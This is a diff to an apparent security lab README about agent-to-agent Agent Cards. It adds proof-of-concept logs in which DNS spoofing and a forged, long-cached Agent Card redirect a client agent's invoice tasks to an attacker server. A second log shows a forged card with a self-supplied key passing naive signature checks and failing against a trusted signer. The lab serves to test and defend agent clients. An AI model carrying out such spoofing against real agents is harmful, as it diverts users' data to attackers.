@@ -144,9 +144,109 @@ client-1  | Fetching agent card from https://agent.invoice.test:443/.well-known/
 client-1  | Failed to establish a connection, invalid certificate
 ```
 
-### Part 2b - TODO
+### Part 2b
 
-### Part 2c - TODO
+In this test case, a client agent receives a forged Agent Card from a malicious server. That Agent Card is then stored in cache for one month, pointing to the malicious server. Even after DNS records have been reset, the client agent still connects to the malicious server. However, when forcefully bypassing the cache, the client agent connects to the legitimate server.
+
+```
+# POC - a client agents can store a spoofed Agent Card with a fake endpoints adress for an unlimited
+# period of time unless cache is forcefully bypassed
+
+# Ip addresses below are:
+# 172.30.0.2 - the legitimate server
+# 172.30.0.3 - the attacker's server
+# 172.30.0.4 - the attacker's DNS server
+# 172.30.0.5 - the client
+
+# DNS spoofing active, client agent connects to what it thinks is a legitimate server, but is
+# in fact connecting to the attacker's server, and gets its spoofed Agent Card
+client-1        | ** Phase 1, connecting to evil server through spoofed DNS **
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Request: [172.30.0.5:39975] (udp) / 'agent.invoice.test.' (AAAA)
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Request: [172.30.0.5:39349] (udp) / 'agent.invoice.test.' (A)
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Reply: [172.30.0.5:39975] (udp) / 'agent.invoice.test.' (AAAA) / RRs:
+# Evil DNS serves a spoofed IP to the client
+evil-dns-1      | [DNS] phase=spoof agent.invoice.test -> 172.30.0.3
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Reply: [172.30.0.5:39349] (udp) / 'agent.invoice.test.' (A) / RRs: A
+evil-server-1   | Evil server served forged Agent Card
+evil-server-1   | 172.30.0.5 - - [20/Oct/2026 08:33:55] "GET /.well-known/agent-card.json HTTP/1.1" 200 -
+client-1        | [PHASE 1] HTTP response from_cache=False
+# The fake Agent Card contains the attacker's adress and instructions to store it in cache for 1 month
+client-1        | [PHASE 1] Cache-Control=public, max-age=2592000
+client-1        | [PHASE 1] Agent endpoint=http://fake_server.com:8080/invoice
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Request: [172.30.0.5:41884] (udp) / 'fake_server.com.' (A)
+evil-dns-1      | [DNS] phase=spoof fake_server.com -> 172.30.0.3
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Reply: [172.30.0.5:41884] (udp) / 'fake_server.com.' (A) / RRs: A
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Request: [172.30.0.5:54822] (udp) / 'fake_server.com.' (AAAA)
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Reply: [172.30.0.5:54822] (udp) / 'fake_server.com.' (AAAA) / RRs:
+evil-server-1   | [Evil server received task: {'message': {'parts': [{'text': 'Client sending invoice #1337 details'}]}}
+evil-server-1   | 172.30.0.5 - - [20/Oct/2026 08:33:55] "POST /invoice HTTP/1.1" 200 -
+client-1        | [PHASE 1] Task handled by Evil Invoice Assistant
+
+# DNS spoofing has ended, but instead of connecting to "agent.invoice.test", the client still
+# connects to fake_server, since that is the adress it has in its Agent Card cache
+client-1        | ** Phase 2, DNS records have been restored but client still connects to evil server using cached address **
+# Use cached address
+client-1        | [PHASE 2] HTTP response from_cache=True
+client-1        | [PHASE 2] Cache-Control=public, max-age=2592000
+client-1        | [PHASE 2] Agent endpoint=http://fake_server.com:8080/invoice
+evil-dns-1      | 2026-10-20 08:33:57 [DNSHandler:Resolver] Request: [172.30.0.5:59574] (udp) / 'fake_server.com.' (A)
+evil-dns-1      | 2026-10-20 08:33:57 [DNSHandler:Resolver] Request: [172.30.0.5:59850] (udp) / 'fake_server.com.' (AAAA)
+evil-dns-1      | 2026-10-20 08:33:57 [DNSHandler:Resolver] Reply: [172.30.0.5:59850] (udp) / 'fake_server.com.' (AAAA) / RRs:
+evil-dns-1      | [DNS] phase=real fake_server.com -> 172.30.0.3
+evil-dns-1      | 2026-10-20 08:33:57 [DNSHandler:Resolver] Reply: [172.30.0.5:59574] (udp) / 'fake_server.com.' (A) / RRs: A
+evil-server-1   | [Evil server received task: {'message': {'parts': [{'text': 'Client sending invoice #1337 details'}]}}
+evil-server-1   | 172.30.0.5 - - [20/Oct/2026 08:33:57] "POST /invoice HTTP/1.1" 200 -
+client-1        | [PHASE 2] Task handled by Evil Invoice Assistant
+
+# Control phase - are the DNS records restored? Forcefully bypass cached addresses to find out
+client-1        | ** Control phase, forcefully bypassing cache, should connect to legit server **
+evil-dns-1      | 2026-10-20 08:33:57 [DNSHandler:Resolver] Request: [172.30.0.5:55239] (udp) / 'agent.invoice.test.' (AAAA)
+evil-dns-1      | 2026-10-20 08:33:57 [DNSHandler:Resolver] Request: [172.30.0.5:38426] (udp) / 'agent.invoice.test.' (A)
+# Client gets the IP of the legitimate server
+evil-dns-1      | [DNS] phase=real agent.invoice.test -> 172.30.0.2
+legit-server-1  | 172.30.0.5 - - [20/Oct/2026 08:33:57] "GET /.well-known/agent-card.json HTTP/1.1" 200 -
+# Client connects to legitimate server
+client-1        | [CONTROL] from_cache=False endpoint=http://agent.invoice.test:8080/invoice
+
+
+```
+
+### Part 2c
+
+A client agent connects to a malicious server and received a forged Agent Card. Since public key and signature verification is optional, the malicious server present a public key where it claims to be the legitimate server, and the client accepts the signature. However, when forcing the agent to check the public key with a CA (in our case modelled as a separate key on another location), the agent rejects the connections.
+
+```
+evil-dns-1     | 2026-10-20 13:15:16 [DNSHandler:DNS] Request: [172.30.0.2:45274] (udp) / 'fake-server.test.' (AAAA)
+evil-dns-1     | Answering fake-server.test. -> 172.30.0.3 (Evil-server's IP)
+evil-dns-1     | 2026-10-20 13:15:16 [DNSHandler:DNS] Reply: [172.30.0.2:45274] (udp) / 'fake-server.test.' (AAAA) / RRs:
+evil-dns-1     | 2026-10-20 13:15:16 [DNSHandler:DNS] Request: [172.30.0.2:41972] (udp) / 'fake-server.test.' (A)
+evil-dns-1     | Answering fake-server.test. -> 172.30.0.3 (Evil-server's IP)
+evil-dns-1     | Spoofing fake-server.test. -> 172.30.0.3
+fake-server-1  | 172.30.0.2 - - [20/Oct/2026 13:15:16] "GET /.well-known/agent-card.json HTTP/1.1" 200 -
+client-1       | Agent: Invoice Assistant
+client-1       | Description: Official invoice agent for real-server.test
+
+# Scenario 1: the client downloads the public key from the malicious server,
+# does not verify it against an external source / CA
+
+client-1       | ========== SCENARIO A ==========
+client-1       | Naive JWS verification
+client-1       | [CLIENT] JWS signature: VALID
+client-1       | [CLIENT] Agent Card: ACCEPTED
+
+# Scenario 2: the client checks the served public key against a CA,
+# in this lab modeled as a second key stored locally
+
+client-1       | ========== SCENARIO B ==========
+client-1       | JWS verification with trusted signer
+client-1       | [CLIENT] JWS signature: VALID
+client-1       | [CLIENT] Signer identity: UNTRUSTED
+client-1       | [CLIENT] Agent Card: REJECTED
+client-1 exited with code 0
+
+```
+
+
 # Minimal signed Agent Card trust demo
 
 Run from the repository root: `docker compose -f signed-card-demo/compose.yaml up --build --abort-on-container-exit`
